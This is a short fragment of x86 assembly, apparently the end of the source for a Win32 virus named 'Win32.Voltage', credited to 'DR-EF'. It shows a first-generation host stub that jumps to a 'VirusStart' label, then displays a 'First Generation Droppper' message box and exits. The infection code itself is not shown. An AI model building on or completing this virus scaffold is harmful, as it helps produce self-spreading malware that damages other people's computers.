	pushad
	jmp	VirusStart
Exit:	push	0h
	push	offset Msg_Title
	push	offset Msg_Text
	push	0h
	call	MessageBoxA
	push	eax
	call	[ExitProcess]

IF	DEBUG
	Msg_Title	db	"[Win32.Voltage - Debug Version] By DR-EF",0
	Msg_Text	db	"First Generation Droppper.",0
ELSE
	Msg_Title	db	"[Win32.Voltage - Relese Version] By DR-EF",0
	Msg_Text	db	"First Generation Droppper.",0
ENDIF

end FirstGenHost
